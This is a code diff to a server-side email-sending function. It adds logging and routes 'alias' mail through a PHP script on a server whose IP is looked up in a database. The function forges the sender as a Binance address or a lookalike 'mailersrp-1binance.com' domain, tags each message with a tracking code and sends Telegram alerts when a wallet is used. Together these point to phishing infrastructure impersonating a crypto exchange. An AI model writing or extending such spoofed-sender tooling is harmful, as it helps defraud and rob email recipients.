@@ -148,13 +148,16 @@ const handler = async (req: Request): Promise<Response> => {
       let sendMethod = 'resend'; // default method
       
       // Get commercial's email preferences
-      const { data: commercialData } = await supabase
+      const { data: commercialData, error: commercialError } = await supabase
         .from('commercials')
         .select('email_domain_preference, email_alias_from')
         .eq('id', commercial_id)
         .single();
       
+      console.log('🔍 Commercial email preferences:', commercialData, 'Error:', commercialError);
+      
       const emailPreference = commercialData?.email_domain_preference || domain || 'domain1';
+      console.log('🎯 Email preference determined:', emailPreference);
       
       if (emailPreference === "domain2") {
         apiKey = Deno.env.get("RESEND_API_KEY_DOMAIN2");
@@ -164,9 +167,13 @@ const handler = async (req: Request): Promise<Response> => {
         // Use PHP sending method with alias
         sendMethod = 'php';
         fromDomain = commercialData?.email_alias_from || "do_not_reply@mailersp2.binance.com";
+        console.log('🔄 ALIAS MODE: Using PHP method with domain:', fromDomain);
+      } else {
+        // Default domain1
+        sendMethod = 'resend';
       }
       
-      console.log('Using method:', sendMethod, 'domain/alias:', fromDomain);
+      console.log('📤 Final send method:', sendMethod, 'domain/alias:', fromDomain);
 
     // Fetch the current server IP from the database
     const { data: serverConfig, error: configError } = await supabase
@@ -463,62 +470,47 @@ const handler = async (req: Request): Promise<Response> => {
     let emailResponse;
     
     if (sendMethod === 'php') {
+      console.log('🔄 USING PHP METHOD for alias sending...');
       // Send via PHP with alias
       try {
+        const phpPayload = {
+          to: to,
+          subject: emailSubject,
+          message: emailContent,
+          from_email: fromDomain,
+          from_name: senderName,
+          tracking_code: trackingCode
+        };
+        
+        console.log('📤 PHP payload:', phpPayload);
+        
         const phpResponse = await fetch(`http://${currentServerIp}/send_email.php`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/x-www-form-urlencoded',
           },
-          body: new URLSearchParams({
-            to: to,
-            subject: emailSubject,
-            message: emailContent,
-            from_email: fromDomain,
-            from_name: senderName,
-            tracking_code: trackingCode
-          }).toString()
+          body: new URLSearchParams(phpPayload).toString()
         });
         
+        console.log('📬 PHP response status:', phpResponse.status, phpResponse.statusText);
+        
         if (!phpResponse.ok) {
-          throw new Error(`PHP sending failed: ${phpResponse.statusText}`);
+          throw new Error(`PHP sending failed: ${phpResponse.status} ${phpResponse.statusText}`);
         }
         
         const phpResult = await phpResponse.text();
-        console.log('PHP send result:', phpResult);
+        console.log('✅ PHP send result:', phpResult);
         
         emailResponse = {
           id: `php_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
-          data: { success: true, method: 'php' }
+          data: { success: true, method: 'php', result: phpResult }
         };
       } catch (phpError) {
-        console.error('PHP sending failed, fallback to Resend:', phpError);
-        // Fallback to Resend if PHP fails
-        if (!resend) {
-          resend = new Resend(apiKey);
-        }
-        emailResponse = await resend.emails.send({
-          from: `${senderName} <donotreply@mailersrp-1binance.com>`,
-          to: [to],
-          subject: emailSubject,
-          html: emailContent,
-          tags: [
-            {
-              name: 'campaign',
-              value: 'wireguard-marketing'
-            },
-            {
-              name: 'tracking_code',
-              value: trackingCode
-            },
-            {
-              name: 'step',
-              value: step ? `step-${step}` : 'step-1'
-            }
-          ]
-        });
+        console.error('❌ PHP sending failed, NO FALLBACK for alias mode:', phpError);
+        throw new Error(`Alias email sending failed: ${phpError.message}`);
       }
     } else {
+      console.log('📨 USING RESEND METHOD...');
       // Send via Resend API
       if (!resend) {
         resend = new Resend(apiKey);
@@ -548,7 +540,7 @@ const handler = async (req: Request): Promise<Response> => {
       });
     }
 
-    console.log("Marketing email sent successfully:", emailResponse);
+    console.log("✅ Marketing email sent successfully:", emailResponse, "Method used:", sendMethod);
 
     // Send Telegram notification if wallet was used in email (send directly to Telegram; fallback to edge function)
     if (walletWasUsed) {
